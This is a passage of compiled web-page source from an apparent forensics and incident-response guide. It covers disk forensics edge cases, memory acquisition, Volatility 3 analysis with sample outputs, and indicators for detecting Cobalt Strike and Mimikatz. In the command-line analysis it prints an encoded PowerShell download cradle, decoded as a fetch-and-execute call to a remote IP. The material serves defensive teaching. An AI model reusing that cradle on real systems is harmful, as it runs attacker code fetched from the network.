            children: "DMDE"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GUI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTFS, FAT, ext4, HFS+"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Partition recovery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Freemium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Recuva"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GUI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTFS, FAT"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Consumer file recovery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Free/Commercial"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "R-Photo"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GUI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NTFS, FAT, exFAT"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Photo recovery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Free"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "48-disk-forensics-edge-cases",
      children: "4.8 Disk Forensics Edge Cases"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "RAID Reconstruction"
        }), " → RAID 0/5/6 requires reassembling stripes before analysis. Command: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "mdadm --assemble --scan"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "BitLocker Encryption"
        }), " → Need recovery key or memory dump containing FVEK (Full Volume Encryption Key). Extract via: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "volatility -f memory.raw bitlocker"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "LUKS Encryption"
        }), " → Need passphrase or memory dump. Extract via: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "volatility -f memory.raw linux.luks"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Hidden Partitions"
        }), " → Use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "mmls"
        }), " to detect partitions not in the partition table. Check for gaps between partitions."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Host Protected Area (HPA)"
        }), " → Hidden area on ATA drives. Detect with: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "hdparm -N /dev/sdb"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Device Configuration Overlay (DCO)"
        }), " → Another hidden area. Detect with: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "hdparm --dco-identify /dev/sdb"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Alternate Data Streams (ADS)"
        }), " → NTFS-only: data hidden behind \":stream\" syntax. Detect: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "dir /r"
        }), " on Windows, ", (0,jsx_runtime.jsx)(_components.code, {
          children: "fls -r"
        }), " with TSK."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Volume Shadow Copy (VSS)"
        }), " → Windows \"previous versions\" can contain deleted file history. Access via ", (0,jsx_runtime.jsx)(_components.code, {
          children: "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\"
        })]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h1, {
      id: "chapter-8-forensics--incident-response-1",
      children: "Chapter 8: Forensics & Incident Response"
    }), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "5-memory-forensics",
      children: "5. Memory Forensics"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " A detective arrives at a crime scene and finds a whiteboard covered in notes. The whiteboard shows: who was logged in (processes), what websites were open (network connections), which applications were running (loaded DLLs), and sticky notes with passwords (encryption keys). Memory forensics is photographing that whiteboard before anyone erases it → because as soon as the power goes out, the whiteboard is wiped clean."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "51-why-memory-forensics-matters",
      children: "5.1 Why Memory Forensics Matters"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Traditional Disk Forensics"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Memory Forensics"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Sees installed programs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sees running programs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Finds encrypted files on disk"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "May capture decryption keys from RAM"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "May miss fileless malware"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "Catches fileless malware"
            }), " that never touches disk"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cannot see active network connections"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lists live connections and listening ports"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Does not capture running processes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Captures process trees with parent-child relationships"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Registry shows installed software"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: ["RAM shows ", (0,jsx_runtime.jsx)(_components.strong, {
              children: "loaded drivers, injected DLLs, and hidden processes"
            })]
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Critical Artifacts Found Only in Memory:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Artifact"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "What It Reveals"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Network connections"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "C2 communication, data exfiltration endpoints"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Process handles"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File, registry, and mutex references"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Loaded modules"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DLL injection, rootkit components"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Code injection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shellcode, reflective DLL loading"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Encryption keys"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "BitLocker FVEK, TrueCrypt passphrases, SSL private keys"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Command history"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PowerShell commands executed in memory"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Clipboard contents"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Passwords, sensitive data copied by user"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Unethered executables"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware that deletes itself from disk after execution"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "52-memory-acquisition-methods",
      children: "5.2 Memory Acquisition Methods"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "windows-memory-acquisition",
      children: "Windows Memory Acquisition"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-powershell",
        children: "# dumpit (Magnet Forensics) → simplest method\n.\\dumpit.exe\n# Output: dumpit_memory.dmp in current directory\n\n# FTK Imager → GUI and CLI\n# GUI: File → Capture Memory → Destination → Capture\n# CLI:\nfcapture.exe /dest=\"D:\\evidence\\\" /noprompt\n\n# WinPmem (part of Rekall)\n.\\winpmem_mini_x64_rc2.exe \\\\.\\pmem D:\\evidence\\memory.raw\n\n# Belkasoft Live RAM Capturer\n# Requires admin privileges\n# GUI: Select destination → Capture\n\n# Comae (for crash dump analysis)\n# Requires Windows Error Reporting settings\nC:\\ProgramData\\Comae\\comae.exe --output=D:\\evidence\\memory.json\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "linux-memory-acquisition",
      children: "Linux Memory Acquisition"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# LiME (Linux Memory Extractor) → recommended\n# Compile the kernel module\ngit clone https://github.com/504ensicsLabs/LiME.git\ncd LiME/src\nmake\n\n# Load module to capture memory\nsudo insmod lime-6.1.0.ko \"path=/evidence/memory.lime format=lime\"\n# Output formats: lime (raw with page info), raw, padded\n\n# AVML (Acquire Volatile Memory for Linux) → precompiled\nsudo ./avml /evidence/memory.raw\n\n# fmem → kernel module for memory access\nsudo ./run.sh /evidence/memory.raw\n\n# /proc/kcore (limited, may not work on all kernels)\nsudo dd if=/proc/kcore of=/evidence/memory.raw bs=1M\n\n# /dev/mem (only first 1 GB on most systems, limited)\nsudo dd if=/dev/mem of=/evidence/memory_1GB.raw bs=1M count=1000\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "macos-memory-acquisition",
      children: "macOS Memory Acquisition"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# macOS Memory Acquisition with osxpmem (Rekall)\nsudo osxpmem.app/Contents/MacOS/osxpmem -o /evidence/memory.raw\n\n# macOS built-in (limited → only kernel memory)\nsudo dtrace -n 'BEGIN { tracemem(0, 1000); exit(0); }'\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "virtual-machine-memory-acquisition",
      children: "Virtual Machine Memory Acquisition"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# VMware: Copy .vmem file (suspended/paused state)\ncp /vmfs/volumes/datastore1/VM/machine.vmem /evidence/\n\n# VMware snapshot with memory\nvmware-cmd VM.vmx createsnapshot \"ForensicSnap\" 1 1\n\n# Hyper-V: Export VM with memory\nExport-VM -Name \"SuspiciousVM\" -Path \"D:\\evidence\\\" -CaptureLiveState CaptureDataConsistentState\n\n# VirtualBox: Save state\nVBoxManage controlvm \"SuspiciousVM\" savestate\n# .sav files are in the VM folder\n\n# QEMU/KVM: Use virsh\nvirsh dump SuspiciousVM /evidence/VM-memory.dump --memory-only --format elf\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "53-volatility-3--memory-analysis",
      children: "5.3 Volatility 3 → Memory Analysis"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Volatility 3 is the industry-standard memory forensics framework. It is written in Python 3 and supports Windows, Linux, and macOS memory dumps."
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "installation",
      children: "Installation"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install from PyPI\npip3 install volatility3\n\n# Or clone from GitHub\ngit clone https://github.com/volatilityfoundation/volatility3.git\ncd volatility3\n\n# Verify installation\npython3 vol.py --help\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "windows-memory-analysis-with-volatility-3",
      children: "Windows Memory Analysis with Volatility 3"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Command Pattern:"
      }), " ", (0,jsx_runtime.jsx)(_components.code, {
        children: "python3 vol.py -f <memory.dump> <os>.<plugin>"
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h5, {
      id: "1-identify-the-operating-system-and-profile",
      children: "1. Identify the Operating System and Profile"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Scan for available profiles\npython3 vol.py -f memory.raw windows.info\n\n# Example output:\n# Volatility 3 Framework x.x.x\n# Windows Version: Windows 10 Version 1909 (Build 18363)\n# Number of Processors: 4\n# Image Date: 2024-06-15 14:30:00 UTC\n# Kernel Base: 0xf8000281a000\n# KdDebuggerDataBlock: 0xf80002c3b0a0\n# MajorVersion: 10\n# MinorVersion: 0\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h5, {
      id: "2-list-running-processes",
      children: "2. List Running Processes"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "python3 vol.py -f memory.raw windows.pstree\n\n# Example output:\n\"\"\"\nPID   PPID  ImageFileName  Offset(V)       Threads  Handles  SessionId  CreateTime\n4     0     System         0x8a2c002a8040  138      0        N/A        2024-06-15 08:00:00.000000\n456   4     smss.exe       0x8a2c0035c040  3        0        N/A        2024-06-15 08:00:15.000000\n632   608   csrss.exe      0x8a2c0041e080  10       0        0          2024-06-15 08:00:20.000000\n708   696   winlogon.exe   0x8a2c0054c080  5        0        0          2024-06-15 08:00:22.000000\n816   696   services.exe   0x8a2c0069b080  9        0        0          2024-06-15 08:00:25.000000\n824   816   svchost.exe    0x8a2c007a5080  15       0        0          2024-06-15 08:00:28.000000\n1044  816   svchost.exe    0x8a2c008c3080  12       0        0          2024-06-15 08:00:30.000000\n1188  824   svchost.exe    0x8a2c009e1080  8        0        0          2024-06-15 08:00:32.000000\n1220  824   svchost.exe    0x8a2c00a2c080  20       0        0          2024-06-15 08:00:33.000000\n1464  816   spoolsv.exe    0x8a2c00b48080  7        0        0          2024-06-15 08:00:35.000000\n2032  816   MsMpEng.exe    0x8a2c00d0c080  10       0        0          2024-06-15 08:01:00.000000\n3420  632   cmd.exe        0x8a2c0140a080  2        0        1          2024-06-15 14:30:05.000000\n3456  3420  powershell.exe 0x8a2c0144c080  6        0        1          2024-06-15 14:30:10.000000\n\"\"\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Analysis:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "cmd.exe (PID 3420) started at 14:30:05 → likely the user opened command prompt"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "powershell.exe (PID 3456) started at 14:30:10 → spawned by cmd.exe → highly suspicious"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Compare with system baseline: no PowerShell session should be running at this time"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h5, {
      id: "3-examine-process-command-lines",
      children: "3. Examine Process Command Lines"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "python3 vol.py -f memory.raw windows.cmdline\n\n# Example output:\n\"\"\"\n3420   cmd.exe           C:\\Windows\\System32\\cmd.exe\n3456   powershell.exe    powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden\n                         -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADM0AC4ANwAyAC4AMQA4AC8AcABhAHkAbABvAGEAZAAnACkA\n\"\"\"\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Decoded Base64:"
      }), "\n", (0,jsx_runtime.jsx)(_components.code, {
        children: "IEX (New-Object Net.WebClient).DownloadString('http://185.234.72.18/payload')"
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "This reveals the PowerShell download cradle → it fetches and executes a payload from a remote server. This is the C2 callback."
    }), "\n", (0,jsx_runtime.jsx)(_components.h5, {
      id: "4-list-network-connections",
      children: "4. List Network Connections"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "python3 vol.py -f memory.raw windows.netscan\n\n# Example output:\n\"\"\"\nOffset      Proto  LocalAddr          LocalPort  ForeignAddr        ForeignPort  State       PID    Owner\n0x8a2c...  TCPv4  192.168.1.105       49152      52.95.110.1        443          ESTABLISHED 816   svchost.exe\n0x8a2c...  TCPv4  192.168.1.105       49153      13.107.4.52        443          ESTABLISHED 1220  svchost.exe\n0x8a2c...  TCPv4  192.168.1.105       49154      185.234.72.18      443          ESTABLISHED 3456  powershell.exe\n0x8a2c...  TCPv4  192.168.1.105       49155      192.168.1.50       445          ESTABLISHED 3456  powershell.exe\n0x8a2c...  TCPv4  0.0.0.0             3389       -                  -            LISTENING   632   svchost.exe\n\"\"\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Analysis:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "PID 3456 (powershell.exe) has an established connection to 185.234.72.18:443 → suspicious C2 server"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "PID 3456 also has a connection to 192.168.1.50:445 (SMB) → lateral movement in progress"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "RDP (3389) is listening → potential for remote access abuse"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h5, {
      id: "5-list-loaded-dlls-for-a-specific-process",
      children: "5. List Loaded DLLs for a Specific Process"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "python3 vol.py -f memory.raw windows.dlllist --pid 3456\n\n# Example output:\n\"\"\"\nPID   Process         Base          Size          LoadCount  Path\n3456  powershell.exe  0x7ff6b4c00000 0x1000        0xffff     C:\\Windows\\System32\\powershell.exe\n3456  powershell.exe  0x7ffc9a800000 0x1a000       0xffff     C:\\Windows\\System32\\ntdll.dll\n3456  powershell.exe  0x7ffc99100000 0x80000       0xffff     C:\\Windows\\System32\\kernel32.dll\n3456  powershell.exe  0x7ffc96800000 0x50000       0xffff     C:\\Windows\\System32\\KernelBase.dll\n3456  powershell.exe  0x7ffc8a000000 0x100000      0xffff     C:\\Windows\\System32\\mscorlib.dll\n3456  powershell.exe  0x7ffc89000000 0x300000      0xffff     C:\\Windows\\System32\\clr.dll\n3456  powershell.exe  0x7ffc87000000 0x1c000       0xffff     C:\\Windows\\System32\\ole32.dll\n3456  powershell.exe  0x7ffc75000000 0x90000       0x001      C:\\Windows\\System32\\amsi.dll\n3456  powershell.exe  0x70000000      0x24000       -1         C:\\Users\\jdoe\\AppData\\Temp\\beacon.dll\n\"\"\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Analysis:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["A suspicious DLL is loaded from Temp directory: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "beacon.dll"
        }), " (base address 0x70000000, unusual → normal DLLs are above 0x7xxxxxxx)"]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "LoadCount = -1 indicates the DLL was manually loaded (LoadLibrary or reflective loading)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "This is likely Cobalt Strike beacon DLL"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h5, {
      id: "6-detect-code-injection",
      children: "6. Detect Code Injection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "python3 vol.py -f memory.raw windows.malfind\n\n# Example output:\n\"\"\"\nVolatility 3 Framework 2.5.0\nProcess: powershell.exe Pid: 3456 Address: 0x2b0000\nVad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\nHex dump:\n2b0000  e8 00 00 00 00 5d 48 81 ec 00 01 00 00 48 8d 2d   .....]H......H.-\n2b0010  f8 ff ff ff 48 83 3d 15 10 00 00 00 75 10 48 8d   ...H.=.....u.H.\n2b0020  05 0e 10 00 00 48 89 02 48 83 c2 04 ff e0 48 8d   .....H..H.....H.\n\nDisassembly:\n0x2b0000: call 0x2b0005\n0x2b0005: pop rbp\n0x2b0006: sub rsp, 0x100\n0x2b000d: lea rbp, [rip-0x8]\n\n7 matches found. Use --dump flag to extract injected code.\n\"\"\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Analysis:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Memory region at 0x2b0000 has PAGE_EXECUTE_READWRITE protection → very suspicious"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Normal pages don't have execute + write simultaneously"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "The shellcode appears to be position-independent (call/pop pattern)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "7 injected code regions found"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h5, {
      id: "7-scan-for-malware-signatures-yara-within-volatility",
      children: "7. Scan for Malware Signatures (YARA within Volatility)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "python3 vol.py -f memory.raw windows.yarascan --yara-rules malware.yara\n\n# Example output:\n\"\"\"\nRule: CobaltStrike_Beacon\nString: \"MZRE\" at offset 0x2b0500\nOwner: powershell.exe PID 3456\nVA: 0x2b0500\nHex: 4d 5a 52 45 ...\n\nRule: Mimikatz_Reference\nString: \"mimidrv\" at offset 0x3a1000\nOwner: lsass.exe PID 640\nVA: 0x3a1000\n\"\"\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h5, {
      id: "8-dump-process-for-further-analysis",
      children: "8. Dump Process for Further Analysis"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Dump a specific process executable\npython3 vol.py -f memory.raw windows.dumpfiles --pid 3456\n\n# Dump all processes\npython3 vol.py -f memory.raw windows.dumpfiles --virtaddr 0x8a2c0144c080\n\n# Extract process memory\npython3 vol.py -f memory.raw windows.memmap --pid 3456 --dump\n# Output: pid.3456.dmp → full process memory space\n\n# Scan extracted memory with YARA\nyara malware_rules.yara pid.3456.dmp\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h5, {
      id: "9-registry-analysis-from-memory",
      children: "9. Registry Analysis from Memory"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Extract registry hives from memory\npython3 vol.py -f memory.raw windows.registry.hivelist\n\n# Example output:\n\"\"\"\nOffset          FileFullPath                   File output\n0xf00000000001  \\SystemRoot\\System32\\config\\SOFTWARE\n0xf00000000002  \\SystemRoot\\System32\\config\\SYSTEM\n0xf00000000003  \\SystemRoot\\System32\\config\\SAM\n0xf00000000004  \\SystemRoot\\System32\\config\\SECURITY\n0xf00000000005  \\SystemRoot\\System32\\config\\DEFAULT\n0xf00000000006  \\Device\\HarddiskVolume1\\Users\\jdoe\\NTUSER.DAT\n0xf00000000007  \\Device\\HarddiskVolume1\\Users\\jdoe\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat\n\"\"\"\n\n# Print specific registry keys\npython3 vol.py -f memory.raw windows.registry.printkey --key \"Microsoft\\Windows\\CurrentVersion\\Run\"\n# → Shows autorun entries (persistence mechanisms)\n\npython3 vol.py -f memory.raw windows.registry.printkey --key \"Microsoft\\Windows\\CurrentVersion\\RunOnce\"\n# → Shows one-time autorun\n\npython3 vol.py -f memory.raw windows.registry.printkey --key \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n# → Current user startup programs\n\n# Dump registry hives for offline analysis\npython3 vol.py -f memory.raw windows.registry.hivedump\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h5, {
      id: "10-additional-volatility-3-plugins",
      children: "10. Additional Volatility 3 Plugins"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# MBR scan (look for bootkits)\npython3 vol.py -f memory.raw windows.mbrscan\n\n# Process handles (find file handles, mutexes, pipes)\npython3 vol.py -f memory.raw windows.handles --pid 3456\n\n# Process environment variables\npython3 vol.py -f memory.raw windows.envars --pid 3456\n\n# SIDs and user accounts\npython3 vol.py -f memory.raw windows.getsids\n\n# Service information\npython3 vol.py -f memory.raw windows.svcscan\n\n# Driver scan (find kernel-mode rootkits)\npython3 vol.py -f memory.raw windows.driverscan\n\n# SSDT (System Service Descriptor Table) hook detection\npython3 vol.py -f memory.raw windows.ssdt\n\n# Kernel modules (Linux)\npython3 vol.py -f memory.lime linux.lsmod\n\n# bash history (Linux)\npython3 vol.py -f memory.lime linux.bash\n\n# Netfilter connections (Linux)\npython3 vol.py -f memory.lime linux.netstat\n\n# Mac process list\npython3 vol.py -f memory.macho mac.pstree\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "54-analyzing-specific-malware-artifacts-in-memory",
      children: "5.4 Analyzing Specific Malware Artifacts in Memory"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "cobalt-strike-detection",
      children: "Cobalt Strike Detection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Indicators:\n- Named pipe patterns: \\\\.\\pipe\\msagent_XX, \\\\.\\pipe\\status_XX\n- MZ header in PAGE_EXECUTE_READWRITE regions\n- Sleep mask artifacts (modified beacon in memory)\n- Specific mutex names: Global\\MSSEAR, Global\\MSOffice_16\n\nVolatility Commands:\n1. malfind → find injected code regions\n2. dlllist → look for anomalous DLL paths\n3. netscan → identify beaconing intervals\n4. pslist → check for masquerading processes (svchost.exe in wrong location)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "mimikatz-detection",
      children: "Mimikatz Detection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Indicators:\n- Process lsass.exe has anomalous handles\n- Known strings: \"mimikatz\", \"mimidrv\", \"wdigest\"\n- Kiwi module loaded in memory\n- Sekurlsa::logonpasswords function strings\n\nVolatility Commands:\n1. handles → check for access to lsass.exe from non-standard processes\n2. yarascan → scan for mimikatz signatures\n3. cmdline → check for sekurlsa invocation\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "metasploitmeterpreter-detection",
      children: "Metasploit/Meterpreter Detection"
